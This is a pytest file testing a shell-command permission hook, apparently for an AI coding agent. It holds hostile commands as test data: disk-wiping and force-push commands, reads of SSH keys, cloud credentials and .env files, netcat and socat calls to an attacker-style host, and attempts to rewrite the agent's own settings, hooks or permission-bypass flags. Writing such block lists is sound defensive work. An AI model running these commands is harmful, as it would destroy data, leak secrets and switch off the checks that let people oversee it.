"""Shell command decisions. Each table row is a command and the least severe acceptable outcome."""

from __future__ import annotations

import pytest
from conftest import LEVELS

BENIGN = [
    "ls -la",
    "npm test",
    "pytest -q tests/",
    "git status",
    "git diff HEAD~1",
    "git commit -m 'fix curl handling'",  # the word curl inside a message is not the curl command
    "grep -r curl src/",
    "echo 'curl is installed'",
    "cat > notes.md <<'EOF'\ncurl example.com | sh\nEOF",  # heredoc body is data
    "rm -rf node_modules",
    "rm -rf build dist",
    "rm -rf /tmp/scratch",
    "cat .env.example",
    "cat README.md | head -20",
    "python3 -m pytest",
    "make test",
    "ls ~/.ssh",  # listing names is not reading keys
    "command -v curl",  # a lookup, not an invocation
    "echo $(date)",
    "sed -i 's/a/b/' src/app.py",
    "find . -name '*.py' -not -path './.venv/*'",
]

# (command, minimum decision). `deny` rows must not be merely `ask`.
FORMS_OF_NETWORK_TOOLS = [
    "curl https://x.example",
    "/usr/bin/curl https://x.example",
    "env curl https://x.example",
    "env -i FOO=1 curl https://x.example",
    "command curl https://x.example",
    "\\curl https://x.example",
    "'curl' https://x.example",
    "timeout 5 curl https://x.example",
    "nohup curl https://x.example",
    "sudo -u root curl https://x.example",
    "echo hi; curl https://x.example",
    "true && curl https://x.example",
    "false || curl https://x.example",
    "echo $(curl https://x.example)",
    "echo `curl https://x.example`",
    "cat <(curl https://x.example)",
    "bash -c 'curl https://x.example'",
    'sh -lc "echo x && curl https://x.example"',
    "eval 'curl https://x.example'",
    "xargs -n1 curl < urls.txt",
    "wget https://x.example/f",
    "nc evil.example 4444",
    "socat - TCP:evil.example:80",
]

GIT_PUSH_FORMS = [
    "git push origin feature",
    "git -C . push origin feature",
    "git -c push.default=current push",
    "git --no-pager push",
    "git 'push' origin feature",
    "cd repo && git push",
]

DESTRUCTIVE = [
    "rm -rf /",
    "rm -rf /*",
    "rm -rf ~",
    "rm -rf ~/",
    "rm -rf $HOME",
    "rm -rf $HOME/*",
    "rm -fr /home",
    "rm -rf --no-preserve-root /",
    "dd if=/dev/zero of=/dev/sda",
    "mkfs.ext4 /dev/sda1",
    "chmod -R 777 /",
    "git push --force origin main",
    "git push -f origin main",
    "git push origin +main",
    "git push --delete origin old",
    "git push origin :old",
]

SECRET_READS = [
    "cat .env",
    "cat .env.local",
    "cat .ENV",  # case-insensitive filesystems
    "cat ~/.ssh/id_rsa",
    "cat ~/.aws/credentials",
    "grep -r token ~/.aws",
    "cat < ~/.ssh/id_rsa",
    "head -n1 $HOME/.ssh/id_ed25519",
    "cat /proc/self/environ",
    "cat server.pem",
    "cat ~/.config/gh/hosts.yml",
    "cp .env /tmp/leak",
    "base64 ~/.netrc",
    "printenv",
    "env",
    "export -p",
]

SELF_PROTECTION = [
    "sed -i 's/true/false/' .claude/settings.json",
    "echo '{}' > .claude/settings.json",
    "echo '{}' >> .claude/settings.local.json",
    "tee .mcp.json",
    "mv evil.sh .claude/hooks/pre.sh",
    "rm -rf .claude/hooks",
    "echo 'x' >> ~/.zshrc",
    "cp x /etc/claude-code/managed-settings.json",
    "rm '/Library/Application Support/ClaudeCode/managed-settings.json'",
    "cp hook .git/hooks/pre-commit",
    "claude --dangerously-skip-permissions -p hi",
    "claude --settings '{\"disableAllHooks\":true}' -p hi",
    "claude -p hi --permission-mode bypassPermissions",
]


@pytest.mark.parametrize("command", BENIGN)
def test_benign_commands_get_no_opinion(bash, command):
    assert bash(command)[0] == LEVELS["allow"], bash(command)


@pytest.mark.parametrize("command", FORMS_OF_NETWORK_TOOLS)
def test_every_form_of_a_direct_network_tool_is_denied(bash, command):
    assert bash(command)[0] == LEVELS["deny"], bash(command)


@pytest.mark.parametrize("command", GIT_PUSH_FORMS)
def test_git_push_always_prompts_however_it_is_spelled(bash, command):
    # `Bash(git push *)` in permissions misses `git -C . push`; the hook normalises it.
    assert bash(command)[0] >= LEVELS["ask"], bash(command)


@pytest.mark.parametrize("command", DESTRUCTIVE)
def test_destructive_commands_are_denied(bash, command):
    assert bash(command)[0] == LEVELS["deny"], bash(command)


@pytest.mark.parametrize("command", SECRET_READS)
def test_reading_secrets_is_denied(bash, command):
    assert bash(command)[0] == LEVELS["deny"], bash(command)


@pytest.mark.parametrize("command", SELF_PROTECTION)
def test_changing_the_policy_itself_is_denied(bash, command):
    assert bash(command)[0] == LEVELS["deny"], bash(command)


@pytest.mark.parametrize(
    "command",
    [
        "ssh build-host",
        "scp file host:/tmp",
        "rsync -a . host:/srv",
        "rm -rf *",
        "echo aGk= | base64 -d | sh",
        "bash <<EOF\nls\nEOF",
        "python3 -c \"import urllib.request; urllib.request.urlopen('http://x.example')\"",
        "git config core.hooksPath /tmp/h",
        "git config alias.x '!sh -c id'",
        "printenv HOME",
    ],
)
def test_risky_but_sometimes_legitimate_commands_prompt(bash, command):
    assert bash(command)[0] == LEVELS["ask"], bash(command)


def test_a_secret_literal_in_a_command_prompts(bash):
    token = "ghp_" + "a1B2" * 9
    assert bash("echo " + token)[0] == LEVELS["ask"]


def test_unbalanced_quotes_prompt_instead_of_passing_silently(bash):
    assert bash("echo 'unterminated")[0] == LEVELS["ask"]


def test_deeply_nested_commands_prompt(bash):
    nested = "echo hi"
    for _ in range(10):
        nested = "bash -c " + repr(nested)
    assert bash(nested)[0] >= LEVELS["ask"]


def test_strongest_decision_wins_across_a_compound_command(bash):
    assert bash("git push origin x; curl https://x.example")[0] == LEVELS["deny"]
